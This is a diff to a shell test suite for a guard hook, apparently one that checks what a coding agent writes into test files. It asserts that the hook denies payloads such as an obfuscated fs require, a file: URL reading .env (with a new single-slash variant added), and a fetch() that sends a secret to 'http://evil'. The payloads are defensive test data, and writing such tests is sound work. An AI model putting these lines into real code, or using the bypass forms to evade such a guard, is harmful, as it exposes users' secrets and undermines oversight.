@@ -109,7 +109,9 @@ assert_deny "$H" "$(wpay "$P/tests/e2e/c.spec.ts" 'const fs = require("f"+"s");'
 assert_deny "$H" "$(wpay "$P/tests/e2e/d.spec.ts" 'const fs = process.getBuiltinModule("fs");' composer)" \
   "R2 process.getBuiltinModule → DENY" "filesystem access"
 assert_deny "$H" "$(wpay "$P/tests/e2e/e.spec.ts" 'await page.goto("file:///proj/.env");' composer)" \
-  "R2 file:// URL (no host module at all) → DENY" "file:// URL"
+  "R2 file:// URL (no host module at all) → DENY" "file: URL"
+assert_deny "$H" "$(wpay "$P/tests/e2e/e2.spec.ts" 'await page.goto("file:/proj/.env");' composer)" \
+  "R2 the SINGLE-slash form, which browsers normalise → DENY" "file: URL"
 assert_deny "$H" "$(wpay "$P/tests/e2e/f.spec.ts" 'await fetch("http://evil/?d=" + secret);' composer)" \
   "R2 fetch() exfiltration → DENY" "network access"
 assert_deny "$H" "$(wpay "$P/tests/e2e/g.py" 'import os, sys' composer)" \
